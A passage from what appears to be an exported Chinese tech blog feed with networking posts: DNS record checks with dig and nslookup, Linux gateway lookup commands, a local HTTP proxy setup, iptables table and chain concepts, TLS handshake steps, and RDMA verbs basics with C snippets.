<h2 id="验证CNAME"><a href="#验证CNAME" class="headerlink" title="验证CNAME"></a>验证CNAME</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@dnclient /]# dig web.dockxen.dns</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-51.el7 &lt;&lt;&gt;&gt; web.dockxen.dns</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 55429</span><br><span class="line">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;web.dockxen.dns.               IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">web.dockxen.dns.        0       IN      CNAME   rhel82.</span><br><span class="line">rhel82.                 0       IN      A       192.168.1.82</span><br><span class="line"></span><br><span class="line">;; Query time: 0 msec</span><br><span class="line">;; SERVER: 172.17.0.2#53(172.17.0.2)</span><br><span class="line">;; WHEN: Mon Nov 20 09:30:59 UTC 2017</span><br><span class="line">;; MSG SIZE  rcvd: 80</span><br><span class="line"></span><br><span class="line">[root@dnclient /]# nslookup web.dockxen.dns</span><br><span class="line">Server:         172.17.0.2</span><br><span class="line">Address:        172.17.0.2#53</span><br><span class="line"></span><br><span class="line">web.dockxen.dns canonical name = rhel82.</span><br><span class="line">Name:   rhel82</span><br><span class="line">Address: 192.168.1.82</span><br></pre></td></tr></table></figure>

<h2 id="验证SRV"><a href="#验证SRV" class="headerlink" title="验证SRV"></a>验证SRV</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@dnclient /]# dig +noall +answer SRV _ldap._tcp.dockxen.mydns</span><br><span class="line">_ldap._tcp.dockxen.mydns. 0     IN      SRV     0 100 8000 myweb.dockxen.mydns.</span><br><span class="line">[root@dnclient /]# nslookup -type=srv _ldap._tcp.dockxen.mydns</span><br><span class="line">Server:         172.17.0.2</span><br><span class="line">Address:        172.17.0.2#53</span><br><span class="line"></span><br><span class="line">_ldap._tcp.dockxen.mydns        service = 0 100 8000 myweb.dockxen.mydns.</span><br></pre></td></tr></table></figure>

<h1 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h1><h2 id="etcd的服务发现"><a href="#etcd的服务发现" class="headerlink" title="etcd的服务发现"></a>etcd的服务发现</h2><p>etcd各个节点之间的通讯使用域名方式访问，由于etcd节点ip地址可以以dhcp方式获取，每次etcd节点重启都有可能导致访问地址发生变化。若使用<code>/etc/hosts</code>文件进行“域名－ip”映射涉及到<code>/etc/hosts</code>文件同步分发问题，所以使用dnsmasq来完成“域名－ip”的映射。</p>
<p>关于etcd的服务发现配置请见<code>参考&amp;鸣谢</code></p>
<h2 id="kube-dns的服务发现"><a href="#kube-dns的服务发现" class="headerlink" title="kube-dns的服务发现"></a>kube-dns的服务发现</h2><p>请见<a href="https://zhoubofsy.github.io/2017/04/27/container/k8s/k8s-analyze-service-discovery/">《K8s服务发现分析》</a></p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://mritd.me/2016/09/01/Etcd-%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/">Etcd集群搭建</a></li>
<li><a href="https://coreos.com/etcd/docs/latest/v2/clustering.html#dns-discovery">DNS Discovery</a></li>
</ul>
]]></content>
      <categories>
        <category>network</category>
      </categories>
      <tags>
        <tag>dnsmasq</tag>
      </tags>
  </entry>
  <entry>
    <title>linux下网关地址查看大全</title>
    <url>/2016/04/29/network/20160429-show-gateway-addr/</url>
    <content><![CDATA[<h1 id="查看网关IP地址"><a href="#查看网关IP地址" class="headerlink" title="查看网关IP地址"></a>查看网关IP地址</h1><ul>
<li>route<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">route -n</span><br></pre></td></tr></table></figure></li>
<li>ip route<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip route show</span><br></pre></td></tr></table></figure></li>
<li>netstat<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -rn</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://blog.csdn.net/wuweilong/article/details/22222873">Linux下查看网关方法</a></li>
</ul>
]]></content>
      <categories>
        <category>network</category>
      </categories>
      <tags>
        <tag>gateway</tag>
      </tags>
  </entry>
  <entry>
    <title>linux 配置 http 全局代理</title>
    <url>/2016/04/14/network/linux-http-proxy-md/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>使用”XX-Net-2.9.2“做代理服务端（XX-Net-2.9.2在github上可以找到）</p>
<h2 id="Linux系统配置"><a href="#Linux系统配置" class="headerlink" title="Linux系统配置"></a>Linux系统配置</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy=http://127.0.0.1:8087</span><br><span class="line">export https_proxy=$http_proxy</span><br><span class="line">export ftp_proxy=$http_proxy</span><br><span class="line">export rsync_proxy=$http_proxy</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>network</category>
      </categories>
      <tags>
        <tag>http</tag>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title>iptables</title>
    <url>/2017/05/12/network/iptables-introduce/</url>
    <content><![CDATA[<p>iptables是一个配置Linux内核防火墙的命令行工具，是netfilter项目的一部分。术语iptables也经常代指该内核级防火墙。iptables用于ipv4，ip6tables用于ipv6。<br>( nftables已经包含在Linux kernel 3.13中，以后会取代iptables成为主要的Linux防火墙工具。 )</p>
<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><p>iptables v1.4.21</p>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>理解 iptables 如何工作的关键是下面这张图。图中在上面的小写字母代表”表”，在下面的大写字母代表”链”。从任何网络端口进来的每一个 IP 数据包都要从上到下的穿过这张图。一种常见的困扰是认为 iptables 对从内部端口进入的数据包和从面向互联网端口进入的数据包采取不同的处理方式，相反，iptabales 对从任何端口进入的数据包都会采取相同的处理方式。可以定义规则使 iptables 采取不同的方式对待从不同端口进入的数据包。当然一些数据包是用于本地进程的，因此在图中表现为从顶端进入，到<code>Local Process</code>停止，而另一些数据包是由本地进程生成的，因此在图中表现为从<code>Local Process</code>发出，一直向下穿过该流程图。</p>
<p><img src="/images/iptables/iptables_traverse.jpg" alt="iptables_traverse.jpg"></p>
<ol>
<li>数据包到达网络接口，比如 eth0</li>
<li>进入 raw 表的 PREROUTING 链，这个链的作用是赶在连接跟踪之前处理数据包</li>
<li>如果进行了连接跟踪，在此处理</li>
<li>进入 mangle 表的 PREROUTING 链，在此可以修改数据包，比如 TOS 等</li>
<li>进入 nat 表的 PREROUTING 链，可以在此做DNAT，但不要做过滤</li>
<li>决定路由，看是交给本地主机还是转发给其它主机<br>一种情况是，数据包就是发给本地主机的:</li>
<li>进入 mangle 表的 INPUT 链，这里是在路由之后，交由本地主机之前，我们也可以进行一些相应的修改</li>
<li>进入 filter 表的 INPUT 链，在这里我们可以对流入的所有数据包进行过滤，无论它来自哪个网络接口</li>
<li>交给本地主机的应用程序进行处理</li>
<li>处理完毕后进行路由决定，看该往那里发出</li>
<li>进入 raw 表的 OUTPUT 链，这里是在连接跟踪处理本地的数据包之前</li>
<li>连接跟踪对本地的数据包进行处理</li>
<li>进入 mangle 表的 OUTPUT 链，在这里我们可以修改数据包，但不要做过滤</li>
<li>进入 nat 表的 OUTPUT 链，可以对防火墙自己发出的数据做 NAT</li>
<li>再次进行路由决定</li>
<li>进入 filter 表的 OUTPUT 链，可以对本地出去的数据包进行过滤</li>
<li>进入 mangle 表的 POSTROUTING 链，到这里已经做完了所有的路由决定，但数据包仍然在本地主机，我们还可以进行某些修改<br>注意，这里不光对经过防火墙的数据包进行处理，还对防火墙自己产生的数据包进行处理</li>
<li>进入 nat 表的 POSTROUTING 链，在这里一般都是用来做 SNAT ，不要在这里进行过滤</li>
<li>进入出去的网络接口<br>一种情况是，数据包要转发给其它主机:</li>
<li>进入 mangle 表的 FORWARD 链，这里也比较特殊，这是在第一次路由决定之后，在进行最后的路由决定之前，我们仍然可以对数据包进行某些修改</li>
<li>进入 filter 表的 FORWARD 链，在这里我们可以对所有转发的数据包进行过滤。需要注意的是：经过这里的数据包是转发的，方向是双向的</li>
<li>进入 mangle 表的 POSTROUTING 链，到这里已经做完了所有的路由决定，但数据包仍然在本地主机，我们还可以进行某些修改</li>
<li>进入 nat 表的 POSTROUTING 链，在这里一般都是用来做 SNAT ，不要在这里进行过滤</li>
<li>进入出去的网络接口</li>
</ol>
<p>该流程图描述链了在任何接口上收到的网络数据包是按照怎样的顺序穿过表的交通管制链。第一个路由策略包括决定数据包的目的地是本地主机（这种情况下，数据包穿过 INPUT 链），还是其他主机（数据包穿过 FORWARD 链）；中间的路由策略包括决定给传出的数据包使用那个源地址、分配哪个接口；最后一个路由策略存在是因为先前的 mangle 与 nat 链可能会改变数据包的路由信息。数据包通过路径上的每一条链时，链中的每一条规则按顺序匹配；无论何时匹配了一条规则，相应的 target&#x2F;jump 动作将会执行。最常用的3个 target 是 ACCEPT, DROP ,或者 jump 到用户自定义的链。内置的链有默认的策略，但是用户自定义的链没有默认的策略。在 jump 到的链中，若每一条规则都不能提供完全匹配，那么数据包像这张图片描述的一样返回到调用链。在任何时候，若 DROP target 的规则实现完全匹配，那么被匹配的数据包会被丢弃，不会进行进一步处理。如果一个数据包在链中被 ACCEPT，那么它也会被所有的父链 ACCEPT，并且不再遍历其他父链。然而，要注意的是，数据包还会以正常的方式继续遍历其他表中的其他链。</p>
<p><img src="/images/iptables/iptables_user_kernel_traverse.png" alt="iptables_user_kernel_traverse.png"></p>
<h2 id="表-Tables"><a href="#表-Tables" class="headerlink" title="表(Tables)"></a>表(Tables)</h2><ul>
<li>raw 用于配置数据包，raw 中的数据包不会被系统跟踪。<br>  作用：决定数据包是否被状态跟踪机制处理，优先级最高，设置raw时一般是为了不再让iptables做数据包的链接跟踪处理，提高性能<br>  内核模块：iptable_raw<br>  chains：OUTPUT, PREROUTING</li>
<li>filter 是用于存放所有与防火墙相关操作的默认表。<br>  作用：过滤数据包<br>  内核模块：iptables_filter<br>  chains：INPUT, FORWARD, OUTPUT</li>
<li>nat 用于网络地址转换（例如：端口转发）。<br>  作用：网络地址转换<br>  内核模块：iptables_nat<br>  chains：PREROUTING, POSTROUTING, OUTPUT</li>
<li>mangle 用于对特定数据包的修改。<br>  作用：修改数据包的服务类型、TTL、并且可以配置路由实现QOS<br>  内核模块：iptable_mangle<br>  chains：PREROUTING, POSTROUTING, INPUT, OUTPUT, FORWARD</li>
<li>security 用于强制访问控制网络规则。<br>  Todo…</li>
</ul>
<p>表之间的顺序：raw –&gt; mangle –&gt; nat –&gt; filter</p>
<h2 id="链-Chains"><a href="#链-Chains" class="headerlink" title="链(Chains)"></a>链(Chains)</h2><ul>
<li>表由链组成，链是一些按顺序排列的规则的列表。<br>  默认的<code>filter</code>表包含<code>INPUT</code>，<code>OUTPUT</code>和<code>FORWARD</code>3条内建的链，这3条链作用于数据包过滤过程中的不同时间点，<code>nat</code>表包含<code>PREROUTING</code>，<code>POSTROUTING</code>和<code>OUTPUT</code>链。</li>
<li>默认情况下，任何链中都没有规则，可以向链中添加自己想用的规则<br>  链的默认规则通常设置为<code>ACCEPT</code>，如果想确保任何包都不能通过规则集，那么可以重置为<code>DROP</code>。默认的规则总是在一条链的最后生效，所以在默认规则生效前数据包需要通过所有存在的规则。</li>
<li>用户可以加入自己定义的链，从而使规则集更有效并且易于修改。</li>
</ul>
<h2 id="规则-Rules"><a href="#规则-Rules" class="headerlink" title="规则(Rules)"></a>规则(Rules)</h2><p>数据包的过滤基于 规则。规则由一个目标（数据包包匹配所有条件后的动作）和很多匹配（导致该规则可以应用的数据包所满足的条件）指定。一个规则的典型匹配事项是数据包进入的端口（例如：eth0 或者 eth1）、数据包的类型（ICMP, TCP, 或者 UDP）和数据包的目的端口。</p>
<p>目标使用<code>-j</code>或者<code>--jump</code>选项指定。目标可以是用户定义的链（例如，如果条件匹配，跳转到之后的用户定义的链，继续处理）、一个内置的特定目标或者是一个目标扩展。内置目标是 ACCEPT， DROP， QUEUE 和 RETURN，目标扩展是 REJECT and LOG。如果目标是内置目标，数据包的命运会立刻被决定并且在当前表的数据包的处理过程会停止。如果目标是用户定义的链，并且数据包成功穿过第二条链，目标将移动到原始链中的下一个规则。目标扩展可以被终止（像内置目标一样）或者不终止（像用户定义链一样）。</p>
<h2 id="策略-police"><a href="#策略-police" class="headerlink" title="策略(police)"></a>策略(police)</h2><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><p><img src="/images/iptables/iptables_usage_main.jpg" alt="iptables_usage_main.jpg"></p>
<p><img src="/images/iptables/iptables_usage_param.jpg" alt="iptables_usage_param.jpg"></p>
<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>Todo…</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://wiki.archlinux.org/index.php/Iptables_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">Iptables (简体中文)</a></li>
<li><a href="http://www.ha97.com/4093.html">iptables的基本概念和数据包流程图</a></li>
<li><a href="http://www.cnblogs.com/ggjucheng/archive/2012/08/19/2646466.html">linux平台下防火墙iptables原理(转)</a></li>
<li><a href="http://www.linuxidc.com/Linux/2012-08/67505.htm">iptables四个表与五个链间的处理关系</a></li>
</ul>
]]></content>
      <categories>
        <category>network</category>
      </categories>
      <tags>
        <tag>firewall</tag>
        <tag>iptables</tag>
      </tags>
  </entry>
  <entry>
    <title>SSL/TLS</title>
    <url>/2017/09/13/network/ssl-tls-layer/</url>
    <content><![CDATA[<p><img src="/images/ssl_tls/ssl_tls_protocol.png" alt="ssl_tls"></p>
<ul>
<li>SSL<br>  Secure Socket Layer，安全套接字层，为Netscape所研发，用以保障在Internet上数据传输之安全，利用数据加密(Encryption)技术，可确保数据在网络上之传输过程中不会被截取。当前版本为3.0。它已被广泛地用于Web浏览器与服务器之间的身份认证和加密数据传输。<br>  SSL协议位于TCP&#x2F;IP协议与各种应用层协议之间，为数据通讯提供安全支持。SSL协议可分为两层： SSL记录协议（SSL Record Protocol）：它建立在可靠的传输协议（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。 SSL握手协议（SSL Handshake Protocol）：它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等</li>
<li>TLS<br>  Transport Layer Security，传输层安全协议，用于两个应用程序之间提供保密性和数据完整性。<br>  TLS 1.0是IETF（Internet Engineering Task Force，Internet工程任务组）制定的一种新的协议，它建立在SSL 3.0协议规范之上，是SSL 3.0的后续版本，可以理解为SSL 3.1，它是写入了 RFC 的。该协议由两层组成： TLS 记录协议（TLS Record）和 TLS 握手协议（TLS Handshake）。较低的层为 TLS 记录协议，位于某个可靠的传输协议（例如 TCP）上面。</li>
</ul>
<h1 id="TLS握手"><a href="#TLS握手" class="headerlink" title="TLS握手"></a>TLS握手</h1><p>TLS协议分为两部分：Handshake Protocol和Record Protocol。其中Handshake Protocol用来协商密钥，协议的大部分内容就是通信双方如何利用它来安全的协商出一份密钥。 Record Protocol则定义了传输的格式。</p>
<p>由于非对称加密的速度比较慢，所以它一般用于密钥交换，双方通过公钥算法协商出一份密钥，然后通过对称加密来通信，当然，为了保证数据的完整性，在加密前要先经过HMAC的处理。</p>
<p><img src="/images/ssl_tls/handshake.svg" alt="handshake"></p>
<p>TLS缺省只进行server端的认证，客户端的认证是可选的(<code>[</code> <code>]</code>中是可选项)。只进行server端的认证叫单向认证，server端客户端同时认证的叫双向认证。</p>
<h2 id="单向认证流程"><a href="#单向认证流程" class="headerlink" title="单向认证流程"></a>单向认证流程</h2><p><img src="/images/ssl_tls/single_handshake.jpg" alt="single-handshake"></p>
<ol>
<li>客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。</li>
<li>服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书</li>
<li>客户端使用服务端返回的信息验证服务器的合法性，包括：<br> 证书是否过期<br> 发型服务器证书的CA是否可靠<br> 返回的公钥是否能正确解开返回证书中的数字签名<br> 服务器证书上的域名是否和服务器的实际域名相匹配<br> 验证通过后，将继续进行通信，否则，终止通信</li>
<li>客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择</li>
<li>服务器端在客户端提供的加密方案中选择加密程度最高的加密方式。</li>
<li>服务器将选择好的加密方案通过明文方式返回给客户端</li>
<li>客户端接收到服务端返回的加密方式后，使用该加密方式生成产生随机码，用作通信过程中对称加密的密钥，使用服务端返回的公钥进行加密，将加密后的随机码发送至服务器</li>
<li>服务器收到客户端返回的加密信息后，使用自己的私钥进行解密，获取对称加密密钥。 </li>
<li>在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。</li>
</ol>
<h2 id="双向认证流程"><a href="#双向认证流程" class="headerlink" title="双向认证流程"></a>双向认证流程</h2><p><img src="/images/ssl_tls/double_handshake.jpg" alt="double-handshake"></p>
<ol>
<li>客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。</li>
<li>服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书</li>
<li>客户端使用服务端返回的信息验证服务器的合法性，包括：<br> 证书是否过期<br> 发型服务器证书的CA是否可靠<br> 返回的公钥是否能正确解开返回证书中的数字签名<br> 服务器证书上的域名是否和服务器的实际域名相匹配<br> 验证通过后，将继续进行通信，否则，终止通信</li>
<li>服务端要求客户端发送客户端的证书，客户端会将自己的证书发送至服务端</li>
<li>验证客户端的证书，通过验证后，会获得客户端的公钥</li>
<li>客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择</li>
<li>服务器端在客户端提供的加密方案中选择加密程度最高的加密方式</li>
<li>将加密方案通过使用之前获取到的公钥进行加密，返回给客户端</li>
<li>客户端收到服务端返回的加密方案密文后，使用自己的私钥进行解密，获取具体加密方式，而后，产生该加密方式的随机码，用作加密过程中的密钥，使用之前从服务端证书中获取到的公钥进行加密后，发送给服务端</li>
<li>服务端收到客户端发送的消息后，使用自己的私钥进行解密，获取对称加密的密钥，在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。</li>
</ol>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://blog.csdn.net/duanbokan/article/details/50847612">Https单向认证和双向认证</a></li>
<li><a href="https://segmentfault.com/a/1190000002554673">SSL&#x2F;TLS原理详解</a></li>
<li><a href="http://www.cnblogs.com/Anker/p/6018032.html">基于openssl的单向和双向认证</a></li>
</ul>
]]></content>
      <categories>
        <category>network</category>
      </categories>
      <tags>
        <tag>ssl</tag>
        <tag>tls</tag>
      </tags>
  </entry>
  <entry>
    <title>RDMA</title>
    <url>/2020/11/07/network/rdma/</url>
    <content><![CDATA[<p>在数据中心领域，远程直接内存访问（英语：remote direct memory access，RDMA）是一种绕过远程主机操作系统内核访问其内存中数据的技术，由于不经过操作系统，不仅节省了大量CPU资源，同样也提高了系统吞吐量、降低了系统的网络通信延迟，尤其适合在大规模并行计算机集群中有广泛应用。在基于NVMe over Fabric的数据中心中，RDMA可以配合高性能的NVMe SSD构建高性能、低延迟的存储网络。</p>
<p>Red Hat和甲骨文公司等软件供应商已经在其最新产品中支持这些API，截至2013年，工程师也已开始开发基于以太网的RDMA网络适配器。Red Hat Enterprise Linux和Red Hat Enterprise MRG已支持RDMA。微软已在Windows Server 2012中通过SMB Direct支持RDMA。</p>
<h1 id="RDMA-原理"><a href="#RDMA-原理" class="headerlink" title="RDMA 原理"></a>RDMA 原理</h1><p>传统的基于Socket套接字（TCP&#x2F;IP协议栈）的网络通信需要经过操作系统协议栈。数据在系统中搬来搬去，因此占用了大量的CPU和内存资源，也加大了网络延时。RDMA解决了传统Socket通信的痛点，采用了Kernel Bypass的工作方式，减少了CPU和内存的占用，也降低了网络延时。</p>
<p><img src="/images/rdma/rdma_theory.jpg" alt="rdma_theory"></p>
<p>目前RDMA有三种不同的硬件实现，分别是InfiniBand、iWARP（internet wide area RDMA Protocol）、RoCE（RDMA over Coverged Ethernet）。</p>
<p><img src="/images/rdma/rdma_theory_2.jpg" alt="rdma_theory_2"></p>
<ul>
<li>Infiniband<br>  支持RDMA的新一代网络协议。 由于这是一种新的网络技术，因此需要支持该技术的NIC和交换机。</li>
<li>RoCE<br>  一个允许在以太网上执行RDMA的网络协议。 其较低的网络标头是以太网标头，其较高的网络标头（包括数据）是InfiniBand标头。 这支持在标准以太网基础设施(交换机)上使用RDMA。 只有网卡应该是特殊的，支持RoCE。<br>  RoCE v1是一种链路层协议，允许在同一个广播域下的任意两台主机直接访问。<br>  RoCE v2是一种Internet层协议，即可以实现路由功能。</li>
<li>iWARP<br>  一个允许在TCP上执行RDMA的网络协议。 IB和RoCE中存在的功能在iWARP中不受支持。 这支持在标准以太网基础设施(交换机)上使用RDMA。</li>
</ul>
<h2 id="关键概念"><a href="#关键概念" class="headerlink" title="关键概念"></a>关键概念</h2><p>** QP(Queue Pair) **</p>
<p>每对QP由Send Queue(SQ)和Receive Queue(RQ)构成，这些队列中管理着各种类型的消息。QP会被映射到应用的虚拟地址空间，使得应用直接通过它访问RNIC网卡。</p>
<p>** CQ(Complete Queue) **</p>
<ol>
<li>完成队列包含了发送到工作队列（WQ）中已完成的工作请求（WR）。每次完成表示一个特定的 WR执行完毕（包括成功完成的WR和不成功完成的WR）。完成队列是一个用来告知应用程序已结束的工作请求的信息（状态、操作码、大小、来源）的机制。</li>
<li>CQ有n个完成队列实体（CQE）。CQE的数量在CQ创建的时候被指定。</li>
<li>当一个CQP被轮询到，它就从CQ中被删除。</li>
<li>CQ是一个CQE的先进选出（FIFO）队列。</li>
<li>CQ能服务于发送队列、接收队列或者同时服务于这两种队列。多个不同QP中的工作请求（WQ）可联系到同一个CQ上。</li>
</ol>
<p>** MR(Memory Region) **</p>
<ol>
<li>内存注册机制允许应用程序申请一些连续的虚拟内存空间或者连续的物理内存空间，将这些内存空间提供给网络适配器作为虚拟的连续缓冲区，缓冲区使用虚拟地址。</li>
<li>内存注册进程锁定了内存页。（为了防止页被替换出去，同时保持物理和虚拟内存的映射）在注册期间，操作系统检查被注册块的许可。注册进程将虚拟地址与物理地址的映射表写入网络适配器。在注册内存时，对应内存区域的权限会被设定。权限包括本地写、远程读、远程写、原子操作、绑定。</li>
<li>每个内存注册（MR）有一个远程的和一个本地的key（r_key，l_key）。本地key被本地的HCA 用来访问本地内存，例如在接收数据操作的期间。远程key提供给远程HCA用来在RDMA操作期间允许远程进程访问本地的系统内存。同一内存缓冲区可以被多次注册（甚至设置不同的操作权限），并且每次注册都会生成不同的key。</li>
</ol>
<p>** HCA **</p>
<ol>
<li>Opening an HCA 打开HCA，准备好HCA供消费者使用。一旦打开了一个HCA设备，只有关闭它以后，才能再次打开。</li>
<li>HCA属性 HCA属性是设备特征，这些属性必须可以被消费者获取。</li>
<li>修改HCA属性 HCA允许修改一组&#x3D;&#x3D;受限制的&#x3D;&#x3D;HCA属性。这些可以修改的属性主要是性能信息和错误计数器管理性息。其他大部分属性或是不可修改的，或是通过General Services Interface &#x2F; Fabric Management Interface进行操作。</li>
<li>关闭HCA 将HCA恢复到初始条件下，同时注销打开HCA时分配的资源。</li>
</ol>
<p>** 寻址 **</p>
<ol>
<li>源端地址 CI(Channel Interface)需要存储每个HCA有效的LID和GID。</li>
<li>目的地址 对于RC服务类型来说，目的地址被保存在本地QP的属性中。</li>
<li>Loopback 由于自寻址的需要，HCA需要支持Loopback。Loopback仅支持于一个HCA中，同一个端口下的QP之间进行。</li>
</ol>
<p>** Protection Domain **</p>
<ol>
<li>PD通过在QP&#x2F;SRQ与MR之间建立联系，获得HCA访问主存的权限。此外，PD还可以用来关联QP和未绑定的内存窗口，用来控制HCA访问主系统内存。</li>
<li>分配保护域 当创建QP，注册MR，分配MW,创建Address Handle时需要分配PD。</li>
<li>释放保护域 如果PD仍然与任何队列对、内存区域、内存窗口、SRQ或地址句柄相关联，则不应释放它。如果尝试这样做，则谓词将立即返回一个错误。</li>
</ol>
<h2 id="RDMA-工作流程"><a href="#RDMA-工作流程" class="headerlink" title="RDMA 工作流程"></a>RDMA 工作流程</h2><ol>
<li>当一个应用执行RDMA读或写请求时，不执行任何数据复制。在不需要任何内核内存参与的条件下，RDMA请求从运行在用户空间中的应用中发送到本地NIC(网卡)。</li>
<li>NIC读取缓冲的内容，并通过网络传送到远程NIC。</li>
<li>在网络上传输的RDMA信息包含目标虚拟地址、内存钥匙和数据本身。请求既可以完全在用户空间中处理(通过轮询用户级完成排列) ，又或者在应用一直睡眠到请求完成时的情况下通过系统中断处理。RDMA操作使应用可以从一个远程应用的内存中读数据或向这个内存写数据。</li>
<li>目标NIC确认内存钥匙，直接将数据写人应用缓存中。用于操作的远程虚拟内存地址包含在RDMA信息中。</li>
</ol>
<h1 id="RDMA-API"><a href="#RDMA-API" class="headerlink" title="RDMA API"></a>RDMA API</h1><p>RDMA API (Verbs)主要有两种操作方式，One-Sided RDMA。包括RDMA Reads, RDMA Writes, RDMA Atomic。这种模式下的RDMA访问完全不需要远端机的任何确认；Two-Sided RDMA。包括RDMA Send, RDMA Receive。这种模式下的RDMA访问需要远端机CPU的参与。</p>
<h2 id="Two-Side-RDMA"><a href="#Two-Side-RDMA" class="headerlink" title="Two-Side RDMA"></a>Two-Side RDMA</h2><ol>
<li>首先，A和B都要创建并初始化好各自的QP，CQ</li>
<li>A和B分别向自己的WQ中注册WQE，对于A，WQ&#x3D;SQ，WQE描述指向一个等到被发送的数据；对于B，WQ&#x3D;RQ，WQE描述指向一块用于存储数据的Buffer。</li>
<li>A的RNIC异步调度轮到A的WQE，解析到这是一个SEND消息，从Buffer中直接向B发出数据。数据流到达B的RNIC后，B的WQE被消耗，并把数据直接存储到WQE指向的存储位置。</li>
<li>AB通信完成后，A的CQ中会产生一个完成消息CQE表示发送完成。与此同时，B的CQ中也会产生一个完成消息表示接收完成。每个WQ中WQE的处理完成都会产生一个CQE。</li>
</ol>
<p>** 双边操作与传统网络的底层Buffer Pool类似，收发双方的参与过程并无差别，区别在零拷贝、Kernel Bypass，实际上对于RDMA，这是一种复杂的消息传输模式，多用于传输短的控制消息。 **</p>
<h3 id="RDMA通信流程"><a href="#RDMA通信流程" class="headerlink" title="RDMA通信流程"></a>RDMA通信流程</h3><ol>
<li>获取RDMA设备列表(ibv_get_device_list)<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 1 获取设备列表 */</span></span><br><span class="line"><span class="type">int</span> num_devices;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ibv_device</span> **<span class="title">dev_list</span> =</span> ibv_get_device_list(&amp;num_devices);</span><br><span class="line"><span class="keyword">if</span> (!dev_list || !num_devices)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;failed to get IB devices\n&quot;</span>);</span><br><span class="line">    rc = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> main_exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>打开一个RDMA设备，获取一个上下文(ibv_open_device ibv_context)<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 2 打开设备，获取设备上下文 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ibv_device</span> *<span class="title">ib_dev</span> =</span> dev_list[<span class="number">0</span>];</span><br><span class="line">res.ib_ctx = ibv_open_device(ib_dev);</span><br><span class="line"><span class="keyword">if</span> (!res.ib_ctx)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;failed to open device \n&quot;</span>);</span><br><span class="line">    rc = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> main_exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>释放RDMA设备列表占用的资源(ibv_free_device_list)<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 3 释放设备列表占用的资源 */</span></span><br><span class="line">ibv_free_device_list(dev_list);</span><br><span class="line">dev_list = <span class="literal">NULL</span>;</span><br><span class="line">ib_dev = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure></li>
